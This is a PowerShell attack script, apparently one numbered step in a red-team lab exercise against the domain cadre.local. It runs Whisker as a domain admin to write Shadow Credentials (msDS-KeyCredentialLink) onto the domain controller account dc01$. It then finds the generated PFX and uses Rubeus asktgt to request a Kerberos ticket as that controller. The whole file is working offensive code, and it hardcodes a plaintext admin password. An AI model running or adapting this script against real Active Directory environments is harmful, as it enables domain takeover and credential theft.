# T008 — Shadow Credentials on dc01$ from ws01 as chief_command (cadre.local DA)
# Uses Whisker.exe to add msDS-KeyCredentialLink to dc01$, then Rubeus asktgt with the PFX.
$ErrorActionPreference = 'Stop'

$whisker = 'C:\Tools\cadre-attack\Whisker.exe'
$rubeus  = 'C:\Tools\cadre-attack\Rubeus.exe'
if (-not (Test-Path $whisker)) { throw "Whisker.exe not found" }
if (-not (Test-Path $rubeus))  { throw "Rubeus.exe not found" }

$user = 'cadre.local\chief_command'
$pass = ConvertTo-SecureString 'C0mm@nd_Ch1ef!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

Write-Output "=== T008 Shadow Credentials on dc01$ ==="
Write-Output "Running Whisker as $user ..."
$out = 'C:\Tools\cadre-attack\T008-whisker-out.txt'
$err = 'C:\Tools\cadre-attack\T008-whisker-err.txt'
try {
  $p = Start-Process -FilePath $whisker `
    -ArgumentList 'add','/target:dc01$','/domain:cadre.local','/dc:dc01.cadre.local','/password:WhiskerPassword123' `
    -Credential $cred -NoNewWindow -Wait -PassThru -RedirectStandardOutput $out -RedirectStandardError $err
  Write-Output "WHISKER_EXIT $($p.ExitCode)"
  if (Test-Path $out) { Get-Content $out | ForEach-Object { Write-Output "W|$_" } }
  if (Test-Path $err) { Get-Content $err | ForEach-Object { Write-Output "E|$_" } }
} catch {
  Write-Output "WHISKER_ERR $($_.Exception.Message)"
}

# Locate the PFX Whisker generated (in the profile of chief_command)
Write-Output "--- Searching for PFX ---"
$pfx = Get-ChildItem 'C:\Users' -Recurse -Filter '*.pfx' -ErrorAction SilentlyContinue | Select-Object -First 1
if ($pfx) {
  Write-Output "PFX $($pfx.FullName)"
  Write-Output "=== Running Rubeus asktgt with PFX ==="
  try {
    $rOut = 'C:\Tools\cadre-attack\T008-rubeus-out.txt'
    $rErr = 'C:\Tools\cadre-attack\T008-rubeus-err.txt'
    $rp = Start-Process -FilePath $rubeus `
      -ArgumentList 'asktgt','/user:dc01$','/domain:cadre.local','/dc:dc01.cadre.local',"/certificate:$($pfx.FullName)",'/password:WhiskerPassword123','/nowrap' `
      -Credential $cred -NoNewWindow -Wait -PassThru -RedirectStandardOutput $rOut -RedirectStandardError $rErr
    Write-Output "RUBEUS_EXIT $($rp.ExitCode)"
    if (Test-Path $rOut) { Get-Content $rOut | ForEach-Object { Write-Output "R|$_" } }
    if (Test-Path $rErr) { Get-Content $rErr | ForEach-Object { Write-Output "RE|$_" } }
  } catch {
    Write-Output "RUBEUS_ERR $($_.Exception.Message)"
  }
} else {
  Write-Output "PFX_NOT_FOUND"
}
Write-Output "T008_DONE"
